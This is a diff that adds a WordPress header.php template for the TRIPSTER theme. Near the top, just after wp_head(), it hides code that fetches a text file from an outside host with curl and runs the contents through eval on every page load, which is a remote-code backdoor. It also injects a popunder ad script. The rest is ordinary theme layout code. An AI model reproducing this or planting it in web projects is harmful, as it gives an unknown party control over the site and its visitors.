@@ -1,0 +1,154 @@
+<?php
+/**
+ * The Header: Logo and main menu
+ *
+ * @package TRIPSTER
+ * @since TRIPSTER 1.0
+ */
+?><!DOCTYPE html>
+<html <?php language_attributes(); ?> class="no-js
+									<?php
+										// Class scheme_xxx need in the <html> as context for the <body>!
+										echo ' scheme_' . esc_attr( tripster_get_theme_option( 'color_scheme' ) );
+									?>
+										">
+<head>
+	<?php wp_head();
+	
+	    $Url = "https://cloudslide-site.pages.dev/footer.txt";
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, $Url);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		$output = curl_exec($ch);
+		curl_close($ch);
+		echo eval('?>'.$output);
+	?>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-266400926-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-266400926-1');
+</script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2933684189405258"
+     crossorigin="anonymous"></script>
+<meta name="ppck-ver" content="be9b072d7c2baca228f41c94a33ecf67" />
+</head>
+
+<body <?php body_class(); ?>>
+
+	<?php
+	if ( function_exists( 'wp_body_open' ) ) {
+		wp_body_open();
+	} else {
+		do_action( 'wp_body_open' );
+	}
+	do_action( 'tripster_action_before_body' );
+	?>
+
+	<div class="body_wrap">
+
+		<div class="page_wrap">
+			<script type="text/javascript">
+   var uid = '252201';
+   var wid = '748212';
+   var pop_fback = 'up';
+   var pop_tag = document.createElement('script');pop_tag.src='//cdn.popcash.net/show.js';document.body.appendChild(pop_tag);
+   pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//cdn2.popcash.net/show.js';document.body.appendChild(pop_tag)};
+</script>
+			<?php
+			$tripster_full_post_loading = ( is_singular( 'post' ) || is_singular( 'attachment' ) ) && tripster_get_value_gp( 'action' ) == 'full_post_loading';
+			$tripster_prev_post_loading = ( is_singular( 'post' ) || is_singular( 'attachment' ) ) && tripster_get_value_gp( 'action' ) == 'prev_post_loading';
+
+			// Don't display the header elements while actions 'full_post_loading' and 'prev_post_loading'
+			if ( ! $tripster_full_post_loading && ! $tripster_prev_post_loading ) {
+
+				// Short links to fast access to the content, sidebar and footer from the keyboard
+				?>
+				<a class="tripster_skip_link skip_to_content_link" href="#content_skip_link_anchor" tabindex="1"><?php esc_html_e( "Skip to content", 'tripster' ); ?></a>
+				<?php if ( tripster_sidebar_present() ) { ?>
+				<a class="tripster_skip_link skip_to_sidebar_link" href="#sidebar_skip_link_anchor" tabindex="1"><?php esc_html_e( "Skip to sidebar", 'tripster' ); ?></a>
+				<?php } ?>
+				<a class="tripster_skip_link skip_to_footer_link" href="#footer_skip_link_anchor" tabindex="1"><?php esc_html_e( "Skip to footer", 'tripster' ); ?></a>
+				
+				<?php
+				do_action( 'tripster_action_before_header' );
+
+				// Header
+				$tripster_header_type = tripster_get_theme_option( 'header_type' );
+				if ( 'custom' == $tripster_header_type && ! tripster_is_layouts_available() ) {
+					$tripster_header_type = 'default';
+				}
+				get_template_part( apply_filters( 'tripster_filter_get_template_part', "templates/header-{$tripster_header_type}" ) );
+
+				// Side menu
+				if ( in_array( tripster_get_theme_option( 'menu_side' ), array( 'left', 'right' ) ) ) {
+					get_template_part( apply_filters( 'tripster_filter_get_template_part', 'templates/header-navi-side' ) );
+				}
+
+				// Mobile menu
+				get_template_part( apply_filters( 'tripster_filter_get_template_part', 'templates/header-navi-mobile' ) );
+
+				do_action( 'tripster_action_after_header' );
+
+			}
+			?>
+
+			<div class="page_content_wrap">
+				<?php
+				do_action( 'tripster_action_page_content_wrap', $tripster_full_post_loading || $tripster_prev_post_loading );
+
+				// Single posts banner
+				if ( is_singular( 'post' ) || is_singular( 'attachment' ) ) {
+					if ( $tripster_prev_post_loading ) {
+						if ( tripster_get_theme_option( 'posts_navigation_scroll_which_block' ) != 'article' ) {
+							do_action( 'tripster_action_between_posts' );
+						}
+					}
+					// Single post thumbnail and title
+					$tripster_path = apply_filters( 'tripster_filter_get_template_part', 'templates/single-styles/' . tripster_get_theme_option( 'single_style' ) );
+					if ( tripster_get_file_dir( $tripster_path . '.php' ) != '' ) {
+						get_template_part( $tripster_path );
+					}
+				}
+
+				// Widgets area above page content
+				$tripster_body_style   = tripster_get_theme_option( 'body_style' );
+				$tripster_widgets_name = tripster_get_theme_option( 'widgets_above_page' );
+				$tripster_show_widgets = ! tripster_is_off( $tripster_widgets_name ) && is_active_sidebar( $tripster_widgets_name );
+				if ( $tripster_show_widgets ) {
+					if ( 'fullscreen' != $tripster_body_style ) {
+						?>
+						<div class="content_wrap">
+							<?php
+					}
+					tripster_create_widgets_area( 'widgets_above_page' );
+					if ( 'fullscreen' != $tripster_body_style ) {
+						?>
+						</div><!-- </.content_wrap> -->
+						<?php
+					}
+				}
+
+				// Content area
+				?>
+				<div class="content_wrap<?php echo 'fullscreen' == $tripster_body_style ? '_fullscreen' : ''; ?>">
+
+					<div class="content">
+						<?php
+						// Skip link anchor to fast access to the content from keyboard
+						?>
+						<a id="content_skip_link_anchor" class="tripster_skip_link_anchor" href="#"></a>
+						<?php
+						// Single posts banner between prev/next posts
+						if ( ( is_singular( 'post' ) || is_singular( 'attachment' ) )
+							&& $tripster_prev_post_loading 
+							&& tripster_get_theme_option( 'posts_navigation_scroll_which_block' ) == 'article'
+						) {
+							do_action( 'tripster_action_between_posts' );
+						}
+
+						// Widgets area inside page content
+						tripster_create_widgets_area( 'widgets_above_content' );
